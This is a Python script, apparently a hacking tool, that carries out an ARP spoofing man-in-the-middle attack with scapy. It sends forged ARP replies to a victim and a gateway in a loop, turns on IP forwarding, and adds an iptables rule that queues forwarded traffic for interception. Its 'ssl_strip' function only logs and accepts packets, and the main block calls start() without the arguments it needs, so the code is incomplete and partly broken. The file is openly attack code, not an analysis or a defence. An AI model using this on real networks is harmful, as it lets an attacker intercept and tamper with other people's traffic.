from scapy.all import * 
import os
from netfilterqueue import NetfilterQueue
import time
import threading

def process_packet(packet):
    print("[+] Packet intercepted...")
    # Accept packet
    packet.accept()

def gateway_spoof(ipGateway, ipAttacker, ipVictim, macGateway, macAttacker, macVictim, interface):
    try:
        while True:
            #telling the victim that we are the gateway
            arpVictim = Ether()/ARP()
            arpVictim[Ether].src = macAttacker
            arpVictim[ARP].hwsrc = macAttacker
            arpVictim[ARP].psrc = ipGateway
            arpVictim[ARP].hwdst = macVictim
            arpVictim[ARP].pdst = ipVictim

            #telling the gateway that we are the victim
            arpGateway = Ether()/ARP()
            arpGateway[Ether].src = macAttacker
            arpGateway[ARP].hwsrc = macAttacker
            arpGateway[ARP].psrc = ipVictim
            arpGateway[ARP].hwdst = macGateway
            arpGateway[ARP].pdst = ipGateway

            sendp(arpVictim, iface=interface)
            sendp(arpGateway, iface=interface)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[-] Stopping ARP spoofing...")
        return

def spoof(ipGateway, ipAttacker, ipVictim, macGateway, macAttacker, macVictim, interface, ):
    gateway_spoof(ipGateway, ipAttacker, ipVictim, macGateway, macAttacker, macVictim, interface)

def ssl_strip():
    # Enable IP forwarding
    os.system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")
    # Set up iptables rule
    os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num 0")

    # Set up packet queue
    queue = NetfilterQueue()
    queue.bind(0, process_packet)

    try:
        print("[+] Starting packet interception...")
        queue.run()
    except KeyboardInterrupt:
        print("\n[-] Stopping packet interception...")
        queue.unbind()

def start(ipVictimNAT, ipAttackerNAT, ipGateway, macVictimNAT, macAttackerNAT, macGateway, interfaceNAT):
    
    gateway_spoof = threading.Thread(target=spoof, args=(ipGateway, ipAttackerNAT, ipVictimNAT, macGateway, macAttackerNAT, macVictimNAT, interfaceNAT))
    ssl_attack = threading.Thread(target=ssl_strip)

    gateway_spoof.start()
    ssl_attack.start()
    gateway_spoof.join()
    ssl_attack.join()


    

if __name__ == "__main__":
    start()


